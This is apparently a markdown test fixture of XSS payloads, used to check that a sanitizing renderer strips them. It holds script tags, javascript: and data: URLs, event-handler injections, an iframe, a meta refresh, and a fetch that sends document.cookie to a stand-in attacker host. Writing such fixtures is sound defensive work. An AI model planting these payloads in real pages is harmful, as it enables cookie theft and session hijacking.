# XSS hostile fixtures

These markdown inputs all contain something dangerous. The S4
MarkdownRenderer + rehype-sanitize must strip every one to
inert / safe HTML.

## Inline script tag

Hello <script>window.alert('xss-script-tag')</script> there.

## Block script tag

<script>
  fetch('https://evil.example/steal?cookie=' + document.cookie);
</script>

## javascript: URL in link

[click me](javascript:alert('xss-js-url'))

## Inline event handler

<img src="x" onerror="alert('xss-onerror')" />

## Inline event handler on a div

<div onclick="alert('xss-onclick')">Click</div>

## SVG with embedded script

<svg><script>alert('xss-svg-script')</script></svg>

## iframe

<iframe src="https://evil.example/"></iframe>

## form (action submission to attacker)

<form action="https://evil.example/steal" method="POST">
  <input name="csrf" value="leaked" />
  <button>submit</button>
</form>

## meta refresh

<meta http-equiv="refresh" content="0; url=https://evil.example/" />

## data: URL with HTML payload

[data link](data:text/html,<script>alert('xss-data-url')</script>)

## Safe content (should survive)

Normal **bold**, *italic*, `inline code`, [a real link](https://example.com).

```js
const safe = 'this code block should render';
```

| col | val |
|-----|-----|
| a   | 1   |
